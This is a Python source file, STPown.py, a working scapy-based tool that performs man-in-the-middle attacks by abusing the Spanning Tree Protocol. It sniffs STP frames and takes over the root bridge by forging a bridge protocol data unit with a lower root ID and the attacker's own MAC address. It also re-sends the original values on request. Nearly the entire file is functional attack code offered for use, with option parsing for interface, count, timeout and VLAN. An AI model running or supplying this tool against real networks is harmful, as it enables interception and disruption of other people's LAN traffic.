#!/usr/bin/env python
##############################################################################
# STPown.py - script to perform MitM attacks by abusing STP protocol         #
# September 2012 - Nicolas Biscos (buffer at 0x90 period fr )                #
#                                                                            #
# This program is free software: you can redistribute it and/or modify       #
# it under the terms of the GNU General Public License as published by       #
# the Free Software Foundation, either version 3 of the License, or          #
# (at your option) any later version.                                        #
#                                                                            #
# This program is distributed in the hope that it will be useful,            #
# but WITHOUT ANY WARRANTY; without even the implied warranty of             #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the               #
# GNU General Public License for more details.                               #
#                                                                            #
# This should have received a copy of the GNU General Public License         #
# along with this program. If not, see <http://www.gnu.org/licenses/>.       #
##############################################################################

import sys
# Suppress scapy complaints
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from optparse import OptionParser
from threading import Thread

class STPown:
   def __init__(self):
      conf.verb = 0
      conf.checkIPaddr = 0
      parser = OptionParser(usage='usage: %prog [-i iface] [-h] [-d] [-c count] [-t timeout] [-e vlan_id]',
                            description='Perform MitM attacks by abusing STP')
      parser.add_option('-i', '--iface',
                        dest="iface", 
                        metavar='IFACE',
                        default=conf.iface,
                        help="interface to listen on.");
      parser.add_option('-c', '--count',
                        dest="count", 
                        metavar='PACKET_COUNT',
                        default=1,
                        help="STP packet count to send. Defaulting to 1.");
      parser.add_option('-t', '--timeout',
                        dest="timeout", 
                        metavar='TIMEOUT',
                        default=10,
                        help="Timeout, if no STP is configured. Defaulting to 10.");
      parser.add_option('-e', '--ext',
                        dest="vlanid", 
                        type='int',
                        default=None,
                        metavar='VLAN_ID',
                        help="Switch to Extended System ID STP mode. Listen and poison VLAN_ID. If not specified, Extended System ID is disabled.");
      parser.add_option('-d', '--debug',
                        dest="debug", 
                        action="store_true",
                        default=False,
                        help="Prints debug messages.");
      self.parser = parser;

   def isSTP(self, packet):
      if( packet.haslayer(STP) and packet.haslayer(Dot3) ):
         if( self.options.ext ):
            rootid = packet[STP].rootid;
            vlanid = rootid & 0xFFF;
            if( vlanid != self.options.vlanid ):
               print 'Drop an STP packet for vlan %s' % str(vlanid)
               return False;
         return True;
      return False;

   def stpown(self, packet):
      if( self.options.debug ):
         packet.show2()
      self.real_mac = packet[Dot3].src
      self.real_bridgeid = packet[STP].bridgeid
      self.real_rootmac = packet[STP].rootmac
      self.real_bridgemac = packet[STP].bridgemac
      self.real_rootid = packet[STP].rootid
      if( self.options.ext ):
         vlanid = self.real_rootid & 0xFFF
         if( self.options.debug ):
            print 'Detected vlan id: %s' % str(vlanid)
         real_ext_rootid = self.real_rootid & 0xF000
         if( self.options.debug ):
            print 'Detected root id : %s' % str(real_ext_rootid)
         rootid = (((real_ext_rootid>>12)-1)<<12) + vlanid
      else:
         if( self.options.debug ):
            print 'Detected root id : %s' % str(self.real_rootid)
         rootid = self.real_rootid - 1;
      if( self.options.debug ):
         print 'New root id : %s' % str(rootid)
      mac=get_if_hwaddr(conf.iface)
      packet[Dot3].src = mac
      packet[STP].rootid = packet[STP].bridgeid = rootid
      packet[STP].rootmac = packet[STP].bridgemac = mac
      if( self.options.debug ):
         print 'Sending new packet: '
         packet.show2()
      sendp(packet)
      print 'Poisonning done !'
      print 'Press Ctrl^D to re-poison back the victim !'
      sys.stdin.read()
      print 'Re-poisonning'
      packet[Dot3].src = self.real_mac
      packet[STP].rootid = self.real_rootid
      packet[STP].bridgeid = self.real_bridgeid
      packet[STP].rootmac = self.real_rootmac
      packet[STP].bridgemac = self.real_bridgemac
      for i in range(5):
         sendp(packet)
      print 'Done'

   def run(self):
     (self.options, args) = self.parser.parse_args();
     if( 0 != len(args) ):
        parser.print_help();
        return
     self.options.ext = False;
     conf.iface = self.options.iface;
     if(self.options.vlanid != None ):
        self.options.ext = True;
     sniff(lfilter=self.isSTP, prn=self.stpown, count=self.options.count, timeout=self.options.timeout, store=0)

if( '__main__' == __name__ ):
   STPown().run()

